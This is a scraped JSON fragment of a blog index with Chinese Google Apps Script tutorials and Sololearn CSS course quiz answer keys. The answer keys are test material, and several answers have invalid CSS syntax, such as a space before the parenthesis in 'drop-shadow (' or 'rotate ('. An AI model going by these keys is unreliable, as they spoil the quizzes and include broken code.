","tags":[{"name":"Facebook","slug":"facebook","used":true,"link":"https://dev-coco.github.io/tag/facebook/"}],"title":"Facebook 专页类别列表","feature":"","link":"https://dev-coco.github.io/post/Facebook-Page-Categories/","stats":{"text":"33 min read","time":1964000,"words":7716,"minutes":33},"date":"2022-09-13 18:59:38","dateFormat":"2022-09-13"},{"content":"IMPORTRANGE 函数表格卡、老出错？不如试试这个方法！ 使用 IMPORTRANGE 函数从其他电子表格获取数据的时候会存在一些弊端，如果数据量特别大，或者特别频繁更新数据的时候，IMPORTRANGE 函数就会出现异常导致无法正常使用，只适用于少量的数据。如果数据量比较大，建议使用 Google 脚本实现这个功能，即使数据量大也可以正常获取，而且写入后的数据是静态的，对工作表的性能影响很小。 通过电子表格 ID 获取存放数据的电子表格。 const dataSheet = SpreadsheetApp.openById('表格ID') 设置范围，并且获取数据。 const getData = dataSheet.getRange('A1:B100').getValues() 获取当前表格。 const sheet = SpreadsheetApp.getActiveSheet() 获取需要写入数据的范围，这个范围必须和获取数据的范围一致，然后把获取到的数据写入到当前表格。 sheet.getRange('A1:B100').setValues(getData) 完整代码如下： const dataSheet = SpreadsheetApp.openById('表格ID') const getData = dataSheet.getRange('A1:B100').getValues() const sheet = SpreadsheetApp.getActiveSheet() sheet.getRange('A1:B100').setValues(getData) ","tags":[{"name":"Google 脚本","slug":"google-script","used":true,"link":"https://dev-coco.github.io/tag/google-script/"}],"title":"使用 Google 脚本实现 IMPORTRANGE","feature":"https://dev-coco.github.io/post-images/Google-Script-Importrange.jpg","link":"https://dev-coco.github.io/post/Google-Script-Importrange/","stats":{"text":"2 min read","time":64000,"words":278,"minutes":2},"date":"2022-09-07 09:22:11","dateFormat":"2022-09-07"},{"content":"使用触发器自动化运行函数。 创建触发器 在左侧选择触发器。 在右下角点击添加触发器。 触发函数 在选择要运行的功能中选择需要运行的函数，每次只能添加一个。 执行类型 基于电子表格 打开时 等待电子表格加载完成后就会执行，每次打开电子表格都会重新执行一次，执行后就不会再重复执行了。 编辑时 仅在修改单元格内容的时候才会执行，每次修改内容都会再次执行。 更改时 不仅在修改单元格的内容的时候会执行，修改工作表名称，或者进行其它的更改都会执行。 表单提交时 需要将表单绑定电子表格，当表格提交的时候就会执行。 时间驱动 特定日期和时间 在指定的时间执行，时间格式：YYYY-MM-DD HH:MM，只会执行一次。 天定时器 在当前某个时间会自动运行，不过这个时间只能是在某个时间段的区间，并不会非常精确的运行。例如在下午 3 点至 4 点，那么就会在这个区间的任意时间运行，每次运行都不会固定在多少分钟运行。 ","tags":[{"name":"Google 脚本","slug":"google-script","used":true,"link":"https://dev-coco.github.io/tag/google-script/"}],"title":"Google 脚本 触发器","feature":"https://dev-coco.github.io/post-images/Google-Script-Trigger.jpg","link":"https://dev-coco.github.io/post/Google-Script-Trigger/","stats":{"text":"2 min read","time":69000,"words":342,"minutes":2},"date":"2022-09-01 19:51:29","dateFormat":"2022-09-01"},{"content":"有一个可以直接调用的接口真是太方便了！ GET 请求触发器 doGet(request) 这是一个 Web 应用的触发器，需要部署 Web 应用后才可以使用。当收到一个 HTTP GET 请求的时候就会执行，将请求的参数传入 request。 请求参数 parameter 请求的参数会返回一个 Object 类型的值。代码示例： function doGet (request) { Logger.log(request.parameter) } 将传入 request 的参数使用 Logger 写入到日志。 返回结果 返回内容 createTextOutput(content) content 放入字符串，会在 Web 应用返回一个文本内容，需要使用 return 返回。代码示例： function doGet () { return ContentService.createTextOutput('测试') } 请求后就返回一个测试的文本。 实例演示 使用网络应用将数据填入电子表格 A1 的位置。 function doGet (request) { const {text} = request.parameter SpreadsheetApp.openById('表格ID').getRange('A1').setValue(text) return ContentService.createTextOutput('完成') } 将请求的参数解析，然后使用 setValue 写入到 A1 单元格。 调用 API const urlStr = { text: 'ok' } const response = await fetch(`放入部署后的链接?${new URLSearchParams(urlStr).toString()}`).then(text =&gt; text.text()) console.log(response) 将 Object 类型的内容使用 URLSearchParams 转换成链接格式，再使用 fetch 发送请求，最后 console 的结果就是前面在 createTextOutput 设置好的文本作为返回结果。请求后会将设置的 ok 内容写入到表格内容 A1 单元格。 ","tags":[{"name":"Google 脚本","slug":"google-script","used":true,"link":"https://dev-coco.github.io/tag/google-script/"}],"title":"Google 脚本 制作 API 接口","feature":"https://dev-coco.github.io/post-images/Google-Script-Create-API.jpg","link":"https://dev-coco.github.io/post/Google-Script-Create-API/","stats":{"text":"2 min read","time":82000,"words":347,"minutes":2},"date":"2022-08-27 12:29:56","dateFormat":"2022-08-27"},{"content":"客户端和服务端互相传输数据。 服务端运行客户端数据 google.script.run.myFunction(…) myFunction 可以设置服务端任意的函数，并且可以放入参数。代码示例： Code.gs function doGet () { return HtmlService.createTemplateFromFile('index').evaluate() } function cellValues (area) { const values = SpreadsheetApp.openById('表格ID').getRange(area).getValues() Logger.log(values) return values } index.html &lt;!DOCTYPE html&gt; &lt;html&gt; &lt;head&gt; &lt;base target=&quot;_top&quot;&gt; &lt;/head&gt; &lt;body&gt; &lt;script&gt; google.script.run.cellValues('A1') &lt;/script&gt; &lt;/body&gt; &lt;/html&gt; 打开 Web 应用后就会执行 cellValues 函数并且传入 A1 字符串。在 Logger 中可以看到获取 A1 单元格的结果。 返回成功执行的结果 withSuccessHandler(function) function 设置回调函数。代码示例： index.html google.script.run.withSuccessHandler(function (result) { console.log(result) }).cellValues('A1') 将返回的结果设置命名为 result 并且传入到 console 输出。 ","tags":[{"name":"Google 脚本","slug":"google-script","used":true,"link":"https://dev-coco.github.io/tag/google-script/"}],"title":"Google 脚本 客户端和服务端通信","feature":"https://dev-coco.github.io/post-images/Google-Script-Messages.jpg","link":"https://dev-coco.github.io/post/Google-Script-Messages/","stats":{"text":"1 min read","time":59000,"words":213,"minutes":1},"date":"2022-08-22 17:39:03","dateFormat":"2022-08-22"},{"content":"在表格增加或删减行或者列。 增加行 insertRows(rowIndex, numRows) rowIndex 放入需要增加行的起始行；numRows 放入需要增加行的数量，非必填参数，默认为 1。代码示例： SpreadsheetApp.getActiveSheet().insertRows(5, 2) 运行后会从第 5 行开始增加 2 行。 删除行 deleteRows(rowPosition, howMany) rowPosition 放入要删除的行的起始行；howMany 放入需要删除的行的数量，非必填参数，默认为 1。代码示例： SpreadsheetApp.getActiveSheet().deleteRows(5, 2) 运行后会从第 5 行开始删除 2 行。 增加列 insertColumns(columnIndex, numColumns) columnIndex 放入需要增加列的起始列；numColumns 放入需要增加列的数量，非必填参数，默认为 1。代码示例： SpreadsheetApp.getActiveSheet().insertColumns(2, 3) 运行后会从第 2 列开始增加 3 列。 删除列 deleteColumns(columnPosition, howMany) columnPosition 放入需要删除的列的起始列；howMany 放入需要删除列的数量，非必填参数，默认为 1。代码示例： 排序 sort(columnPosition, ascending) columnPosition 放入需要排序的列，ascending 放入布尔值进行升序或者降序，非必填参数，默认为 true。示例代码： SpreadsheetApp.getActiveSheet().sort(2, false) 将第二列进行倒序排序。 ","tags":[{"name":"Google 脚本","slug":"google-script","used":true,"link":"https://dev-coco.github.io/tag/google-script/"}],"title":"Google 脚本 操作行和列","feature":"https://dev-coco.github.io/post-images/Google-Script-Operate-Row-Column.jpg","link":"https://dev-coco.github.io/post/Google-Script-Operate-Row-Column/","stats":{"text":"2 min read","time":68000,"words":295,"minutes":2},"date":"2022-08-20 17:51:33","dateFormat":"2022-08-20"},{"content":"发布一个 Web 页面。 引用文件创建 HTML 模版 createTemplateFromFile(filename) filename 放入文件名称。代码示例： Google Script HtmlService.createTemplateFromFile('index') index.html &lt;!DOCTYPE html&gt; &lt;html&gt; &lt;head&gt; &lt;base target=&quot;_top&quot;&gt; &lt;/head&gt; &lt;body&gt; &lt;p&gt;test&lt;/p&gt; &lt;/body&gt; &lt;/html&gt; 需要提前创建好 index 文件，然后再使用此方法创建。 输出 HTML evaluate() HTML 代码无法直接输出到 Web 页面，需要使用 evaluate() 解析后才可以输出。代码示例： function doGet () { return HtmlService.createTemplateFromFile('index').evaluate() } iframe 权限 setXFrameOptionsMode(mode) mode 设置模式。代码示例： HtmlService.createTemplateFromFile('index').evaluate().setXFrameOptionsMode(HtmlService.XFrameOptionsMode.ALLOWALL) 设置好后将允许在 iframe 中引用，不过要注意安全性问题，防止被劫持数据。 侧边栏创建 Web 页面 showSidebar(userInterface) userInterface 放入解析后的 HTML 代码。示例代码： const html = HtmlService.createTemplateFromFile('sidebar').evaluate() SpreadsheetApp.getUi().showSidebar(html) 运行后会在表格右侧边栏加载 Web 界面，不过要注意的是，宽度只有 300px，无法变得更大，所以需要注意页面内容的尺寸，以免无法正常显示。 设置标题 setTitle(title) title 放入标题内容。示例代码： const html = HtmlService.createTemplateFromFile('index').evaluate().setTitle('标题') SpreadsheetApp.getUi().showSidebar(html) 发布后标题就会改为设置好的内容。 ","tags":[{"name":"Google 脚本","slug":"google-script","used":true,"link":"https://dev-coco.github.io/tag/google-script/"}],"title":"Google 脚本 创建 Web 页面","feature":"https://dev-coco.github.io/post-images/Google-Script-Create-Web-Page.jpg","link":"https://dev-coco.github.io/post/Google-Script-Create-Web-Page/","stats":{"text":"2 min read","time":81000,"words":318,"minutes":2},"date":"2022-08-18 14:15:36","dateFormat":"2022-08-18"},{"content":"屏蔽 Bitdefender 和 Avira 杀毒软件强制给浏览器安装插件。 有的杀毒软件会强制给浏览器安装一些“安全性”插件，而且每次新建浏览器人员的时候都会被强制安装上。 即使卸载软件的时候，官方提供的卸载工具也不会完全将这些插件完全卸载掉，还是会被强制安装到浏览器。那么就可以把这些插件的 ID 设置到浏览器的插件黑名单内，这样就可以彻底屏蔽掉，不会再强制安装浏览器了。 下载链接：Disable-Bitdefender-and-Avira-Extensions 同时支持 Chrome、Brave、Edge 三款浏览器，安装后重启浏览器即可生效。 ","tags":[{"name":"软件","slug":"software","used":true,"link":"https://dev-coco.github.io/tag/software/"},{"index":-1,"name":"macOS","slug":"macos","used":true,"link":"https://dev-coco.github.io/tag/macos/"}],"title":"屏蔽 Bitdefender 和 Avira 安装插件","feature":"","link":"https://dev-coco.github.io/post/Disable-Bitdefender-Avira-Extensions/","stats":{"text":"1 min read","time":39000,"words":187,"minutes":1},"date":"2022-08-18 06:35:09","dateFormat":"2022-08-18"},{"content":"在电子表格创建一个菜单。 创建菜单 createMenu(caption) caption 放入菜单名称，然后创建一个菜单。代码示例： const ui = SpreadsheetApp.getUi() ui.createMenu('主菜单') .addItem('菜单1', 'test') .addToUi() 需要先执行 SpreadsheetApp.getUi() 才能在用户界面添加菜单，然后使用 ui.createMenu() 创建一个名字叫主菜单的菜单，再使用 addItem 在菜单的下面添加项目，菜单内至少包含一个项目才可以创建，最后执行 addToUi() 将菜单添加到用户界面。 添加项目 addItem(caption, functionName) caption 放入项目名称，functionName 放入函数的名称，文本类型，当点击了对应项目的时候，就会触发设置好的函数。 function myFunction() { const ui = SpreadsheetApp.getUi() const menu = ui.createMenu('主菜单') .addItem('菜单1', 'test') .addToUi() } function test () { Logger.log('run') } 例如在菜单添加了一个菜单 1 的项目，点击后就会运行设置好的 test 函数。 分割线 addSeparator() 在指定位置增加一个分割线。代码示例： const ui = SpreadsheetApp.getUi() ui.createMenu('主菜单') .addItem('菜单1', 'test') .addSeparator() .addToUi() 需要在菜单的后面加，而且必须在 addToUi() 的前面。 添加子菜单 addSubMenu(menu) 需要在菜单的后面使用，menu 放入子菜单。代码示例： const ui = SpreadsheetApp.getUi() const menu = ui.createMenu('主菜单') .addItem('菜单1', 'test') .addItem('菜单2', test) .addSeparator() const subMenu = ui.createMenu('二级菜单') .addItem('菜单3', 'test') .addItem('菜单4', test) menu.addSubMenu(subMenu) .addToUi() 创建后一个二级菜单后，将二级添加到主菜单的后面，这样就可以添加一个二级菜单了。 打开表格自动触发 onOpen() 这是一个触发器函数，在打开电子表格的时候会自动运行，通常的时候会配合菜单一起使用。代码示例： function onOpen() { const ui = SpreadsheetApp.getUi() const menu = ui.createMenu('主菜单') .addItem('菜单1', 'test') .addToUi() } 将 onOpen() 设置为函数名称，每次打开表格的时候会自动运行函数内的代码，这样就可以实现在打开表格后自动加载好菜单。 ","tags":[{"name":"Google 脚本","slug":"google-script","used":true,"link":"https://dev-coco.github.io/tag/google-script/"}],"title":"Google 脚本 菜单","feature":"https://dev-coco.github.io/post-images/Google-Script-Create-Menu.jpg","link":"https://dev-coco.github.io/post/Google-Script-Create-Menu/","stats":{"text":"3 min read","time":121000,"words":514,"minutes":3},"date":"2022-08-15 19:43:30","dateFormat":"2022-08-15"},{"content":"社交平台多合一。 演示页面 演示页面：https://dev-coco.github.io/other/Social-Template.html 生成器：https://dev-coco.github.io/Online-Tools/Social-Platform-Generator.html 使用方法 将需要生成的社交平台拖到右侧，并且输入链接。 右侧默认会有一个图片标记的输入框，输入图片链接后，会显示横幅图，建议使用 11:3 的尺寸。如果不需要，可以将它拖到左侧。 如果选择的社交平台数量是单数，需要将末尾空白的拖到右侧底部，预留一个位置，否则可能会显示不正常。 设置好后点击生成按钮，再点击下载。然后就会生成好一个社交平台的页面了。 ","tags":[{"index":-1,"name":"其它","slug":"other","used":true,"link":"https://dev-coco.github.io/tag/other/"}],"title":"社交平台生成器","feature":"","link":"https://dev-coco.github.io/post/Social-Platform-Generator/","stats":{"text":"1 min read","time":41000,"words":189,"minutes":1},"date":"2022-08-05 00:52:23","dateFormat":"2022-08-05"},{"content":"Sololearn CSS course CSS Filters answers .q,.a{font-weight:bold;}.q{color:red;}.a{color:green} Here are all the questions and answers that I hope will help you learn CSS course. Other course answers Sololearn CSS course The Basics answers Sololearn CSS course Working with Text answers Sololearn CSS course Properties answers Sololearn CSS course Positioning and Layout answers Sololearn CSS course CSS3 Basics answers Sololearn CSS course Gradients &amp; Backgrounds answers Sololearn CSS course Transitions &amp; Transforms answers 72.1 Lesson CSS Filters Question: CSS Filters Which of the following is not a filter function? Answer: inverse Question: The drop-shadow Function Fill in the blanks to create a red shadow. Answer: &lt;style&gt; .withshadow { filter: drop-shadow (5px 9px 2px red); } &lt;/style&gt; 73.1 Lesson Filter Functions Question: The grayscale Function Fill in the blanks to apply the grayscale function. Answer: &lt;style&gt; .filtered { filter: grayscale(50%); } &lt;/style&gt; Question: The sepia Function Fill in the blanks to create a valid sepia function. Answer: &lt;style&gt; .filtered { filter: sepia(200%); } &lt;/style&gt; Question: The saturate Function How many parameters does the saturate function have? Answer: 1 Question: The hue-rotate Function Rotating the hue by 120deg will make the red color in an image: Answer: green Question: The invert Function Fill in the blanks to completely invert the image. Answer: &lt;style&gt; .fully_inverted { filter: invert(100%); } &lt;/style&gt; 74.1 Lesson Opacity &amp; Brightness Question: The opacity Function Fill in the blanks to make an image semi-transparent. Answer: &lt;style&gt; #my_image .ghost { filter: opacity(50%); width: 100px; height: 100px; } &lt;/style&gt; Question: The brightness Function Fill in the blanks to make an image brighter and circled. Answer: &lt;style&gt; .very_bright { filter: brightness(150%); border-radius: 50%; } &lt;/style&gt; Question: The contrast Function Fill in the blanks to make an image completely gray. Answer: &lt;style&gt; #my_image .gray_effect { filter: contrast(0%); width: 150px; } &lt;/style&gt; Question: The blur Function Fill in the blanks to apply a blur effect. Answer: &lt;style&gt; #my_image .glitchy { border: solid 1px black; filter: blur(5px); } &lt;/style&gt; 75.1 Lesson Using Multiple CSS Filters Question: Using Multiple CSS Filters Fill in the blanks to make an image circled and blurred with a gray shadow. Answer: &lt;style&gt; #avatar .deactivated { filter: saturate(30%) drop-shadow(5px 9px 2px gray) blur(1px); border-radius: 50%; } &lt;/style&gt; 76.1 Lesson Module 8 Quiz Question: Which of the following is a filter function? Answer: invert Question: Fill in the blanks to rotate the hue by 80 degrees. Answer: &lt;style&gt; .filtered { filter: hue-rotate(80deg); } &lt;/style&gt; Question: Fill in the blanks to change the saturation of an image by 55% and partially invert it. Answer: &lt;style&gt; .modified { filter: saturate(55%) invert(70%); } &lt;/style&gt; Question: Fill in the blanks to create an image which is completely grayscale and has a grey shadow effect. Answer: &lt;style&gt; .filtered { filter: grayscale(100%) drop-shadow(5px 9px 2px gray); } &lt;/style&gt; Question: Fill in the blanks to adjust the brightness of an image to 110% and apply a blur effect to it. Answer: &lt;style&gt; .filtered { filter: blur(5px) brightness(110%); } &lt;/style&gt; Question: Fill in the blanks to make the image circled and blurred with 30% sepia applied. Answer: &lt;style&gt; img { border-radius: 50%; filter: sepia(30%) drop-shadow(5px 9px 2px red) blur(1px); width: 100px; height: 100px; } &lt;/style&gt; ","tags":[{"name":"Sololearn","slug":"sololearn","used":true,"link":"https://dev-coco.github.io/tag/sololearn/"}],"title":"Sololearn CSS course CSS Filters answers","feature":"https://dev-coco.github.io/post-images/Sololearn-CSS-Course.png","link":"https://dev-coco.github.io/post/Sololearn-CSS-Course-CSS-Filters-Answers/","stats":{"text":"4 min read","time":223000,"words":597,"minutes":4},"date":"2022-08-02 21:07:20","dateFormat":"2022-08-02"},{"content":"Sololearn CSS course Transitions &amp; Transforms answers .q,.a{font-weight:bold;}.q{color:red;}.a{color:green} Here are all the questions and answers that I hope will help you learn CSS course. Other course answers Sololearn CSS course The Basics answers Sololearn CSS course Working with Text answers Sololearn CSS course Properties answers Sololearn CSS course Positioning and Layout answers Sololearn CSS course CSS3 Basics answers Sololearn CSS course Gradients &amp; Backgrounds answers Sololearn CSS course CSS Filters answers 64.1 Lesson Transitions Question: CSS3 Transitions Which of the following is not a supported parameter of the transition property? Answer: type Question: The Transition Property Add a transition property that changes the background color in 5 seconds. Answer: transition: background-color 5s ease-in; Question: transition-timing-function Which of the following timing functions defines custom transitions? Answer: cubic-bezier() CSS 65.1 Lesson transform: rotate() Question: CSS3 Transforms What value does the rotate function take? Answer: angle Question: Using Negative Values Add the transformation property to rotate the element 45 degrees, counter-clockwise. Answer: transform: rotate(-45deg); 66.1 Lesson transform origin, translate(), skew() Question: transform-origin Which choice is the default value for the transform-origin property? Answer: center Question: The translate() Method Add a translate function that moves the element 50 pixels from the left and 100 pixels from the top. Answer: transform: translate (50px, 100px); Question: The skew() Method Which value type is used in the skew function? Answer: degrees 67.1 Lesson scale(), Multiple Transformations Question: The scale() Method Fill in the blank to reduce the element to 20% of its original size. Answer: transform: scale(0.2); Question: Multiple Transforms When adding multiple transformations in a single transform property, separate them with ... Answer: spaces 68.1 Lesson Keyframes &amp; Animation Question: CSS3 Animations Can you have multiple key frames in an animation property? Answer: Yes Question: The @keyframes Rule Which alternative word can be used in place of 0%? Answer: from Question: The @keyframes Rule Fill in the blank to define an animation named &quot;anim&quot; containing keyframes. Answer: @keyframes anim 69.1 Lesson Animation Properties Question: The animation-name Property Fill in the blanks to make the animation complete in 5 seconds: Answer: -webkit-animation-duration:5s; Question: Animation Properties Fill in the blank to specify a 2-second delay before the animation begins. Answer: animation-delay:2s; Question: More Animation Properties Which property value is used to have the animation repeat forever? Answer: infinite Question: animation Property Add an animation named sizechange, which starts after 2 seconds, runs for 5 seconds, uses the ease function, and loops forever. Answer: &lt;style&gt; .test { animation-name: sizechange; animation-duration: 5s; animation-timing-function: ease; animation-delay: 2s; animation-iteration-count: infinite; } &lt;/style&gt; 70.1 Lesson 3D Transforms Question: 3D Transforms Add a rotate function that rotates the element 45 degrees around the Z axis. Answer: transform: rotateZ(45deg); Question: Translations Fill in the missing value to &quot;push&quot; the elements 100 pixels back. Answer: transform: translateZ(-100px); Question: Perspective Higher perspective value means: Answer: further distance 71.1 Lesson Module 7 Quiz Question: Which of these is a valid CSS3 transformation statement? Answer: scale() Question: How will an element with a statement transform: translate(0, 100px) behave? Answer: Pushed down 100 pixels Question: Which transformation does not exist in CSS3? Answer: skewB Question: Fill in the blanks to rotate the object with the id &quot;ball&quot; 45 degrees counter-clockwise. Answer: &lt;style&gt; #ball { transform : rotate (-45deg); } &lt;/style&gt; Question: Fill in the blanks to make the first letter of the paragraph red and bold. Also, flip the paragraph upside down. Answer: &lt;style&gt; p { transform: rotate(180deg); } p::first-letter { color: red; font-weight: bold; } &lt;/style&gt; ","tags":[{"name":"Sololearn","slug":"sololearn","used":true,"link":"https://dev-coco.github.io/tag/sololearn/"}],"title":"Sololearn CSS course Transitions & Transforms answers","feature":"https://dev-coco.github.io/post-images/Sololearn-CSS-Course.png","link":"https://dev-coco.github.io/post/Sololearn-CSS-Course-Transitions-and-Transforms-Answers/","stats":{"text":"4 min read","time":238000,"words":636,"minutes":4},"date":"2022-08-02 21:06:19","dateFormat":"2022-08-02"},{"content":"Sololearn CSS course Gradients &amp; Backgrounds answers .q,.a{font-weight:bold;}.q{color:red;}.a{color:green} Here are all the questions and answers that I hope will help you learn CSS course. Other course answers Sololearn CSS course The Basics answers Sololearn CSS course Working with Text answers Sololearn CSS course Properties answers Sololearn CSS course Positioning and Layout answers Sololearn CSS course CSS3 Basics answers Sololearn CSS course Transitions &amp; Transforms answers Sololearn CSS course CSS Filters answers 56.1 Lesson Linear Gradients Question: Creating Linear Gradients What types of color values can NOT be used within the linear gradient property? Answer: CMYK Question: Color Stops Add the missing color stop value to create sharp lines between the colors. Answer: background: linear-gradient (red 20%, green 20%, green 80%, blue 80%); Question: Direction of the Gradient Which one of the following directions is not supported for the linear-gradient? Answer: Center Question: Angle of the Gradient linear-gradient (left, red, yellow); Which one of the following choices is equivalent to the example above? Answer: linear-gradient(0deg, red, yellow); Question: Repeating a Linear-Gradient Which property is correct for creating a repeating gradient? Answer: repeating-linear-gradient 57.1 Lesson Radial Gradients Question: Radial Gradients Select the correct parameters for radial gradient. Answer: Size Position Color-stops Question: Setting the Shapes What is the default value for the &quot;shape&quot; parameter? Answer: Ellipse Question: Radial Gradient Position Which choice is not an acceptable value for &quot;position&quot; parameter? Answer: Radian Question: Setting the Color Stops Add a circular radial gradient to produce black and red colors, with color-stops accordingly at 20 pixels and 70 pixels. Answer: background: radial-gradient (circle, black 20px, red 70px); 58.1 Lesson background-size Question: The background-size Property Resize the background image to a height of 100 pixels and a width of 200 pixels. Answer: background-size: 200px 100px; Question: The background-size Values Which property scales the image so that both width and height fit inside the content area? Answer: contain 59.1 Lesson background-clip Question: The background-clip Property Which value is not used with the background-clip property? Answer: text-box Question: background-clip with Images Does background-clip work with images? Answer: Yes 60.1 Lesson Transparent Borders Question: Transparent Borders with background-clip Drag and drop from the options below to create transparent borders for an element. Answer: &lt;style&gt; .test { background-clip: padding-box; border: 20px solid rgba(0, 0, 0, 0.3); } &lt;/style&gt; 61.1 Lesson Multiple Background Images Question: Multiple Backgrounds The last image in the background-image list will appear at the ... Answer: Bottom Question: Multiple Backgrounds Fill in the blanks to add two background images to the element, with the first positioned at the top left corner, and the other at the top right corner. Answer: &lt;style&gt; .test { background-image: url(1.jpg), url(2.jpg); background-repeat: no-repeat; background-position: left top, right top; } &lt;/style&gt; 63.1 Lesson Module 6 Quiz Question: Add a circular radial gradient to produce red and blue, with color-stops accordingly at 15 pixels and 25 pixels. Answer: background: radial-gradient(50px 50px, red 15px, blue 25px); Question: In the background-clip property, which value allows for the creation of transparent borders? Answer: padding-box Question: Drag and drop from the options below to make the background image of the element 100 x 100 pixels in size. Also, set the opacity of the element to 50%: Answer: &lt;style&gt; #element { background-image: url('test.jpg'); background-size: 100px 100px; opacity: 0.5; } &lt;/style&gt; Question: Drag and drop from the options below to apply 50% opacity to the div, and make it also work in IE: Answer: &lt;style&gt; div { opacity: 0.5; filter: alpha(opacity=50); } &lt;/style&gt; ","tags":[{"name":"Sololearn","slug":"sololearn","used":true,"link":"https://dev-coco.github.io/tag/sololearn/"}],"title":"Sololearn CSS course Gradients & Backgrounds answers","feature":"https://dev-coco.github.io/post-images/Sololearn-CSS-Course.png","link":"https://dev-coco.github.io/post/Sololearn-CSS-Course-Gradients-and-Backgrounds-Answers/","stats":{"text":"5 min read","time":243000,"words":650,"minutes":5},"date":"2022-08-02 00:02:36","dateFormat":"2022-08-02"},{"content":"Sololearn CSS course CSS3 Basics answers .q,.a{font-weight:bold;}.q{color:red;}.a{color:green} Here are all the questions and answers that I hope will help you learn CSS course. Other course answers Sololearn CSS course The Basics answers Sololearn CSS course Working with Text answers Sololearn CSS course Properties answers Sololearn CSS course Positioning and Layout answers Sololearn CSS course Gradients &amp; Backgrounds answers Sololearn CSS course Transitions &amp; Transforms answers Sololearn CSS course CSS Filters answers 44.1 Lesson Introduction to CSS3 Question: CSS3 Is it possible to have multiple backgrounds in CSS3? Answer: Yes Question: CSS3: New Features CSS defines two types of gradients: linear and ... Answer: radial Question: CSS3: New Features Which CSS3 feature allows animation from one CSS property value to another? Answer: Transitions 45.1 Lesson Vendor Prefixes Question: CSS Vendor Prefixes Fill in the blank to add the right prefix for Google Chrome. Answer: -webkit-border-radius: 15px; Question: Browser Prefixes Drag and drop from the options below to support border-radius in Mozilla Firefox, as well as in Webkit-based browsers. Answer: &lt;style&gt; .test { -webkit-border-radius: 8px; -moz-border-radius: 8px; } &lt;/style&gt; 46.1 Lesson Rounded Corners Question: The border-radius Property Add the border-radius values to indicate 0 pixels to the top-left, 15 pixels to the bottom-left, 10 pixels to the bottom-right, 20 pixels to the top-right: Answer: &lt;style&gt; .test { border-radius: 0px 20px 10px 15px; } &lt;/style&gt; Question: Creating a Circle To make a circle, the border radius should be ... Answer: equal to half of the height and the width 47.1 Lesson box-shadow Question: The box-shadow Property Add the box shadow property for a result of 10 pixels vertical offset, 20 pixels horizontal offset, and red for the color. Answer: box-shadow: 20px 10px red; Question: Blur and Spread Which two choices indicate optional values for the box-shadow? Answer: Spread distance, Blur distance Question: Negative Values Place the box-shadow property values in the correct order. Answer: Horizontal offset Vertical offset Blur Spread Color 48.1 Lesson Box Shadow Techniques Question: Creating an Inner Shadow Which keyword is used to create shadow within the element? Answer: inset Question: Layering Multiple Shadows Multiple box shadows are separated by ... Answer: , 49.1 Lesson Transparency Effect Question: Transparency Effect Fill in the blanks to create a footer with an inset box-shadow and a 1 pixel border at the top. Answer: &lt;style&gt; #footer { border-top: 1px solid rgba(0, 0, 0, 0.3); background: rgba(0, 0, 0, 0.25); box-shadow: inset 0 1px rgba(255, 255, 255, 0.3); height: 40px; } &lt;/style&gt; 50.1 Lesson text-shadow Question: The text-shadow Property Add a 25-pixel left and 15-pixel down blue text-shadow. Answer: &lt;style&gt; p { text-shadow: -25px 15px blue; } &lt;/style&gt; Question: Multiple Text Shadows How many text-shadow properties can an element accept? Answer: Multiple 51.1 Lesson Pseudo Classes Question: Working with Pseudo-Classes Style the first child of the &lt;p&gt; element. Answer: &lt;style&gt; p:first-child { background-color: yellow; } &lt;/style&gt; 52.1 Lesson Pseudo Elements Question: Working with Pseudo Elements Which of the following is NOT a pseudo element in CSS? Answer: ::heading Question: Working with Pseudo Elements Add an image prior to the paragraph using a pseudo element. Answer: &lt;style&gt; p::before{ content: url(&quot;img.jpg&quot;); } &lt;/style&gt; 53.1 Lesson word-wrap Question: The word-wrap Property Fill in the blanks to fit the text into the paragraph: Answer: &lt;style&gt; p { width: 300px; word-wrap: break-word; } &lt;/style&gt; 54.1 Lesson @font-face Question: The @font-face Rule Which two of the following font types are supported in Firefox, Safari, and Chrome? Answer: .ttf .otf Question: Using the @font-face Rule Define a new font named &quot;test&quot;. Answer: &lt;style&gt; @font-face { font-family: &quot;test&quot;; src: url(&quot;test.otf&quot;); } &lt;/style&gt; 55.1 Lesson Module 5 Quiz Question: In the following code snippet, what value is given for the bottom-right corner? border-radius: 10px 20px 30px 40px; Answer: 30 Question: When defining a new font in CSS3, use… Answer: @font-face Question: Drag and drop from the options below to color the text in the paragraph with id &quot;mytext&quot; red. Also, add a black shadow to the text that is 5 pixels to the right and 3 pixels down. Answer: &lt;style&gt; #mytext { text-shadow: 5px 3px #000; color: red; } &lt;/style&gt; Question: Fill in the blanks so that the first line of the paragraph uses the newly defined font called &quot;test&quot;. Answer: &lt;style&gt; @font-face { font-family: &quot;test&quot;; src: url(test.ttf); } p::first-line { font-family: &quot;test&quot;; } &lt;/style&gt; ","tags":[{"name":"Sololearn","slug":"sololearn","used":true,"link":"https://dev-coco.github.io/tag/sololearn/"}],"title":"Sololearn CSS course CSS3 Basics answers","feature":"https://dev-coco.github.io/post-images/Sololearn-CSS-Course.png","link":"https://dev-coco.github.io/post/Sololearn-CSS-Course-CSS3-Basics-Answers/","stats":{"text":"6 min read","time":312000,"words":832,"minutes":6},"date":"2022-08-02 00:01:49","dateFormat":"2022-08-02"},{"content":"Sololearn CSS course Positioning and Layout answers .q,.a{font-weight:bold;}.q{color:red;}.a{color:green} Here are all the questions and answers that I hope will help you learn CSS course. Other course answers Sololearn CSS course The Basics answers Sololearn CSS course Working with Text answers Sololearn CSS course Properties answers Sololearn CSS course CSS3 Basics answers Sololearn CSS course Gradients &amp; Backgrounds answers Sololearn CSS course Transitions &amp; Transforms answers Sololearn CSS course CSS Filters answers 36.1 Lesson The display Property Question: display: block What value of the &quot;display&quot; property makes the inline element act as a blocking level element? Answer: block Question: display: inline What value of the &quot;display&quot; property makes the block level element act as an inline element? Answer: display: inline; Question: display:none Make the element with the id=&quot;mystyle&quot; disappear: Answer: &lt;style&gt; #mystyle { display: none; } &lt;/style&gt; 37.1 Lesson The visibility Property Question: The visibility Property The values of the &quot;visibility&quot; property are: Answer: visible hidden 38.1 Lesson Positioning Question: Positioning Elements Why is the &quot;static&quot; value used in positioning? Answer: To make the element run in the natural order of the page Question: Fixed Positioning Drag and drop from the options below to fix the paragraph to 100px from the top and 50px from the left: Answer: &lt;style&gt; p { position: fixed; left: 50px; top: 100px; } &lt;/style&gt; Question: Relative Positioning What is the purpose of the &quot;relative&quot; value? Answer: It puts the element relative to the normal flow 39.1 Lesson Floating Question: Floating In which directions can the elements be floated? Answer: right left Question: Elements Next to Each Other What property along with float is used in the example to make the elements float side by side? Answer: width 40.1 Lesson The clear Property Question: Clearing the Float If there is an element with a float property, which neighbor elements will be affected? Answer: The ones coming after that element 